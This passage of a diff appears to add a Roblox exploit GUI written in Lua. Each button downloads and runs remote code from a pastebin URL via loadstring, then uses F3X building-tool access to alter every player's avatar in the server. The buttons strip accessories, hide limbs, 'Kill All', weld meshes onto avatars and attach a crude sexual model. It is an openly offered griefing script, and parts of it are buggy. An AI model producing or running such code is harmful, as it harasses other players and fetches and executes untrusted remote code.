+					part.BrickColor = BrickColor.new(9)
+					part1.Material = ("Smooth Plastic")
+					part1.Size = Vector3.new(1, 1, 1)
+					part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, 0.5, -1.8)
+					wait()
+	
+					part1:WeldTo(player.Character.HumanoidRootPart)
+	
+				end)
+	
+			end
+	
+	
+		end)
+		Section1:NewButton("Big Penis All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+	
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part.Material = ("Smooth Plastic")
+					part.Size = Vector3.new(1.5, 1.5, 3)
+					part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -2)
+					wait()
+					part:WeldTo(player.Character.HumanoidRootPart)
+	
+					local part2 = F3X.new("Ball", workspace)
+					part2.CanCollide = false
+					part2.BrickColor = BrickColor.new(3)
+					part2.Material = ("Smooth Plastic")
+					part2.Size = Vector3.new(2.5, 2.5, 4)
+					part2.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0.8, -0.5, -1)
+					wait()
+					part2:WeldTo(player.Character.HumanoidRootPart)
+	
+					local part3 = F3X.new("Ball", workspace)
+					part3.CanCollide = false
+					part3.Material = ("Smooth Plastic")
+					part3.BrickColor = BrickColor.new(22)
+					part3.Size = Vector3.new(2, 2, 3)
+					part3.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, -3.5)
+					wait()
+					part3:WeldTo(player.Character.HumanoidRootPart)
+					local part1 = F3X.new("Ball", workspace)
+					part1.CanCollide = false
+					part.BrickColor = BrickColor.new(3)
+					part1.Material = ("Smooth Plastic")
+					part1.Size = Vector3.new(2.5, 2.5, 4)
+					part1.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(-0.8, -0.5, -1)
+					wait()
+	
+					part1:WeldTo(player.Character.HumanoidRootPart)
+	
+				end)
+	
+			end
+	
+	
+		end)
+		Section1:NewButton("Kill All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+	
+					F3X.Object(player.Character.Head).CFrame = game:GetService("Players").LocalPlayer.Character["Left Arm"].CFrame * CFrame.new(0, -0.5, 0)
+	
+	
+				end)
+			end
+	
+		end)
+		Section1:NewButton("Domino Troll", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+					part.Size = Vector3.new(1, 1, 1)
+					part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()
+					part:WeldTo(player.Character["Head"])
+					F3X.Object(player.Character["Head"]).Transparency = 1
+					local lol = part:AddMesh()
+					lol.MeshId = "http://www.roblox.com/asset/?id=4918900585"
+					lol.TextureId = "http://www.roblox.com/asset/?id=4918900636"
+					lol.Scale = Vector3.new(1, 1, 1)
+				end)
+			end
+	
+		end)
+		Section1:NewButton("Potato Troll", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+	
+					part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()
+					part:WeldTo(player.Character["Head"])
+					F3X.Object(player.Character["Head"]).Transparency = 1
+					local lol = part:AddMesh()
+					lol.MeshId = "http://www.roblox.com/asset/?id=4946447704"
+					lol.TextureId = "http://www.roblox.com/asset/?id=4946447928"
+					lol.Scale = Vector3.new(4, 4, 4)
+				end)
+			end
+		end)
+		Section1:NewButton("Sonic Troll", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+	
+					part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()
+					part:WeldTo(player.Character["Head"])
+					F3X.Object(player.Character["Head"]).Transparency = 1
+					local lol = part:AddMesh()
+					lol.MeshId = "http://www.roblox.com/asset/?id=430064078"
+					lol.TextureId = "http://www.roblox.com/asset/?id=430064079"
+					lol.Scale = Vector3.new(0.8, 0.8, 0.8)
+				end)
+			end
+		end)
+		Section1:NewButton("Troll Face", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+	
+					part.CFrame = player.Character["Head"].CFrame * CFrame.new(0.2,0, -0.6)    wait()
+					part:WeldTo(player.Character["Head"])
+					F3X.Object(player.Character["Head"]).Transparency = 1
+					local lol = part:AddMesh()
+					lol.MeshId = "http://www.roblox.com/asset/?id=6900071612"
+					lol.TextureId = "http://www.roblox.com/asset/?id=6900071652"
+					lol.Scale = Vector3.new(1.7, 1.7, 1.7)
+				end)
+			end
+		end)
+		Section1:NewButton("Skirt All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+	
+					part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+					part:WeldTo(player.Character["Torso"])
+	
+					local lol = part:AddMesh()
+					lol.MeshId = "http://www.roblox.com/asset/?id=6970465326"
+					lol.TextureId = "http://www.roblox.com/asset/?id=6970465363"
+					lol.Scale = Vector3.new(1, 1, 1)
+				end)
+			end
+		end)
+		Section1:NewButton("SpiderMan All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+	
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+	
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+					part.Size = Vector3.new(1, 1, 1)
+					part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+					part:WeldTo(player.Character["Torso"])
+					local duck = part:AddMesh()
+					duck.MeshId = "http://www.roblox.com/asset/?id=6834091733"
+					duck.TextureId = "http://www.roblox.com/asset/?id=6834092689"
+	
+					duck.Scale = Vector3.new(1, 1, 1)
+					F3X.Object(player.Character["Torso"]).Transparency = 1
+	
+	
+				end)
+			end
+		end)
+	
+		Section1:NewButton("Funky All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+					for i = 1,1 do
+						local part = F3X.new("Part", workspace)
+						part.Locked = true
+						part.CanCollide = false
+						part.Anchored = false
+						part.BrickColor = BrickColor.new(226)
+	
+						part.Size = Vector3.new(1, 1, 1)
+						part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+						part:WeldTo(player.Character["Torso"])
+						local duck = part:AddMesh()
+						duck.MeshId = "http://www.roblox.com/asset/?id=6533498609"
+						duck.TextureId = "http://www.roblox.com/asset/?id=6533498648"
+	
+						duck.Scale = Vector3.new(.01, .01, .01)
+						F3X.Object(player.Character["Torso"]).Transparency = 1
+						for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do
+							if v:IsA('Accessory') then
+								v:Destroy()
+							end
+						end
+					end
+				end)
+			end
+		end)
+		Section1:NewButton("Duck All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+					for i = 1,1 do
+						local part = F3X.new("Part", workspace)
+						part.Locked = true
+						part.CanCollide = false
+						part.Anchored = false
+						part.BrickColor = BrickColor.new(226)
+	
+						part.Size = Vector3.new(1, 1, 1)
+						part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+						part:WeldTo(player.Character["Torso"])
+						local duck = part:AddMesh()
+						duck.MeshId = "http://www.roblox.com/asset/?id=9419831"
+						duck.TextureId = "http://www.roblox.com/asset/?id=9419827"
+	
+						duck.Scale = Vector3.new(5, 5, 5)
+						F3X.Object(player.Character["Torso"]).Transparency = 1
+						for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do
+							if v:IsA('Accessory') then
+								v:Destroy()
+							end
+						end
+					end
+				end)
+			end
+		end)
+		Section1:NewButton("AmongUS All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {Transparency = 1})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.Size = Vector3.new(3, 4, 3)
+					part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 0)
+					wait()
+					part:WeldTo(player.Character.HumanoidRootPart)
+					local mesh = part:AddMesh()
+					mesh.MeshId = "rbxassetid://6235963214"
+					mesh.TextureId = "rbxassetid://6235963270"
+					mesh.Scale = Vector3.new(.1, .1, .1)
+				end)
+			end
+		end)
+		Section1:NewButton("Noob All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+					for i = 1,1 do
+						local part = F3X.new("Part", workspace)
+						part.Locked = true
+						part.CanCollide = false
+						part.Anchored = false
+						part.BrickColor = BrickColor.new(226)
+	
+						part.Size = Vector3.new(1, 1, 1)
+						part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+						part:WeldTo(player.Character["Torso"])
+						local duck = part:AddMesh()
+						duck.MeshId = "http://www.roblox.com/asset/?id=2711200539"
+						duck.TextureId = "http://www.roblox.com/asset/?id=2711200587"
+	
+						duck.Scale = Vector3.new(1, 1, 1)
+						F3X.Object(player.Character["Torso"]).Transparency = 1
+						for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do
+							if v:IsA('Accessory') then
+								v:Destroy()
+							end
+						end
+					end
+				end)
+			end
+		end)
+		Section1:NewButton("Anime All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+					for i = 1,1 do
+						local part = F3X.new("Part", workspace)
+						part.Locked = true
+						part.CanCollide = false
+						part.Anchored = false
+						part.BrickColor = BrickColor.new(226)
+	
+						part.Size = Vector3.new(1, 1, 1)
+						part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+						part:WeldTo(player.Character["Torso"])
+						local duck = part:AddMesh()
+						duck.MeshId = "http://www.roblox.com/asset/?id=7262213072"
+						duck.TextureId = "http://www.roblox.com/asset/?id=7262215836"
+	
+	
+						duck.Scale = Vector3.new(.5, .5, .5)
+						F3X.Object(player.Character["Torso"]).Transparency = 1
+						for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do
+							if v:IsA('Accessory') then
+								v:Destroy()
+							end
+						end
+					end
+				end)
+			end
+		end)
+		Section1:NewButton("EggDog All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+					for i = 1,1 do
+						local part = F3X.new("Part", workspace)
+						part.Locked = true
+						part.CanCollide = false
+						part.Anchored = false
+						part.BrickColor = BrickColor.new(226)
+	
+						part.Size = Vector3.new(1, 1, 1)
+						part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+						part:WeldTo(player.Character["Torso"])
+						local duck = part:AddMesh()
+						duck.MeshId = "http://www.roblox.com/asset/?id=3142513417"
+						duck.TextureId = "http://www.roblox.com/asset/?id=3142513433"
+	
+	
+						duck.Scale = Vector3.new(.1, .1, .1)
+						F3X.Object(player.Character["Torso"]).Transparency = 1
+						for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do
+							if v:IsA('Accessory') then
+								v:Destroy()
+							end
+						end
+					end
+				end)
+			end
+		end)
+		Section1:NewButton("BlockMan All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+						F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+					end
+				end)
+				local part = F3X.new("Part", workspace)
+				part.Locked = true
+				part.CanCollide = false
+				part.Anchored = false
+				part.BrickColor = BrickColor.new(1)
+	
+				part.Size = Vector3.new(3, 1.5, 1.5)
+				part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()
+				part:WeldTo(player.Character["Head"])
+				local part = F3X.new("Part", workspace)
+				part.Locked = true
+				part.CanCollide = false
+				part.Anchored = false
+				part.BrickColor = BrickColor.new(1)
+	
+				part.Size = Vector3.new(1.2, 3, 1.5)
+				part.CFrame = player.Character["Left Arm"].CFrame * CFrame.new(0,0, 0)    wait()
+				part:WeldTo(player.Character["Left Arm"])
+				local part = F3X.new("Part", workspace)
+				part.Locked = true
+				part.CanCollide = false
+				part.Anchored = false
+				part.BrickColor = BrickColor.new(1)
+	
+				part.Size = Vector3.new(1.2, 3, 1.5)
+				part.CFrame = player.Character["Right Arm"].CFrame * CFrame.new(0,0, 0)    wait()
+				part:WeldTo(player.Character["Right Arm"])
+				local part = F3X.new("Part", workspace)
+				part.Locked = true
+				part.CanCollide = false
+				part.Anchored = false
+				part.BrickColor = BrickColor.new(1)
+	
+				part.Size = Vector3.new(1.2, 3, 1.5)
+				part.CFrame = player.Character["Right Leg"].CFrame * CFrame.new(0,0, 0)    wait()
+				part:WeldTo(player.Character["Right Leg"])
+				local part = F3X.new("Part", workspace)
+				part.Locked = true
+				part.CanCollide = false
+				part.Anchored = false
+				part.BrickColor = BrickColor.new(1)
+	
+				part.Size = Vector3.new(1.2, 3, 1.5)
+				part.CFrame = player.Character["Left Leg"].CFrame * CFrame.new(0,0, 0)    wait()
+				part:WeldTo(player.Character["Left Leg"])
+				local part = F3X.new("Part", workspace)
+				part.Locked = true
+				part.CanCollide = false
+				part.Anchored = false
+				part.BrickColor = BrickColor.new(1)
+	
+				part.Size = Vector3.new(2, 3, 1.5)
+				part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+				part:WeldTo(player.Character["Torso"])
+	
+			end
+		end)
+		Section1:NewButton("Knuckles All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+	
+	
+					local pchar = player.Character               
+					pchar.Head.Transparency = 1
+					pchar["Left Arm"].Transparency = 1
+					pchar["Right Arm"].Transparency = 1
+					pchar["Left Leg"].Transparency = 1
+					pchar["Right Leg"].Transparency = 1 
+	
+					local part = F3X.new("Part", workspace)
+					part.Locked = true
+					part.CanCollide = false
+					part.Anchored = false
+					part.BrickColor = BrickColor.new(226)
+	
+					part.Size = Vector3.new(1, 1, 1)
+					part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()
+					part:WeldTo(player.Character["Torso"])
+					local duck = part:AddMesh()
+					duck.MeshId = "http://www.roblox.com/asset/?id=5330551132"
+					duck.TextureId = "http://www.roblox.com/asset/?id=5330551192"
+	
+					duck.Scale = Vector3.new(5, 5, 5)
+					F3X.Object(player.Character["Torso"]).Transparency = 1
+	
+	
+				end)
+			end
+		end)
+		Section1:NewButton("BigHead All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game:GetService("Players"):GetChildren()) do
+				spawn(function()
+					F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})
+					for _,limb in pairs(player.Character:GetChildren()) do
+						if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then
+							F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()
+						end
+					end
+					local part = F3X.new("Part", workspace)
+					part.CanCollide = false
+					part.BrickColor = BrickColor.new(23)
+					part.Material = ("Smooth Plastic")
+					part.Size = Vector3.new(1,1,1)
+					part.CFrame = player.Character.Head.CFrame * CFrame.new(0, 0, 0)
+					wait()
+					part:WeldTo(player.Character.Head)
+	
+	
+					local Arm2 = part:AddMesh()
+					Arm2.Type = ""
+					Arm2.Scale = Vector3.new(2.5,2.5,2.5)
+				end)
+			end
+		end)
+		Section1:NewButton("Rainbow All", "", function()
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+			for _,player in pairs(game.Players:GetPlayers()) do
+				spawn(function()
+					F3X.Edit(player.Character:GetChildren(), {})
+					while wait(0.7) do
+						F3X.Object(player.Character["Head"]).BrickColor = BrickColor.new(154)
+						F3X.Object(player.Character["Torso"]).BrickColor = BrickColor.new(154)
+						F3X.Object(player.Character["Left Leg"]).BrickColor = BrickColor.new(154)
+						F3X.Object(player.Character["Right Leg"]).BrickColor = BrickColor.new(154)
+						F3X.Object(player.Character["Left Arm"]).BrickColor = BrickColor.new(154)
+						F3X.Object(player.Character["Right Arm"]).BrickColor = BrickColor.new(154)
+					end
+				end)
+			end
+	
+	
+		end)
+		local Tab = Window:NewTab("Tools")
+		local Section2 = Tab:NewSection("Tools")
+		Section2:NewButton("Gravity Hammer", "", function()
+	
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(5,0,0)*  CFrame.new(0,0.5, -1.45)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=33685862"
+			duck.TextureId = "http://www.roblox.com/asset/?id=33685897"
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("ShotGun", "", function()
+	
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.74,0,0)*  CFrame.new(0,0, -1.85)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=94219391"
+			duck.TextureId = "http://www.roblox.com/asset/?id=94219470"
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Pro Sign", "", function()
+	
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
+			part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)
+			part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(6.27,0,0)*  CFrame.new(0,-1, -1.85)  wait()
+			part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])
+			local duck = part:AddMesh()
+			duck.MeshId = "http://www.roblox.com/asset/?id=15631335"
+			duck.TextureId = "http://www.roblox.com/asset/?id=21433483"
+	
+			duck.Scale = Vector3.new(1, 1, 1)
+	
+			game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character
+	
+		end)
+		Section2:NewButton("Tommy's Gun", "", function()
+	
+			player = game.Players.LocalPlayer
+	
+			Tool0 = Instance.new("Tool")
+			Part1 = Instance.new("Part")
+	
+			Tool0.Parent = player.Backpack
+			Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)
+			Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)
+			Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)
+			Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)
+			Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)
+			Part1.Name = "Handle"
+			Part1.Parent = Tool0
+			Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+			Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)
+			Part1.Size = Vector3.new(0,0,0)
+			Part1.BottomSurface = Enum.SurfaceType.Smooth
+			Part1.TopSurface = Enum.SurfaceType.Smooth
+	
+	
+	
+	
+	
+	
+			local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
+	
+	
+	
+	
+			local part = F3X.new("Part", workspace)
+	
+			part.Locked = true
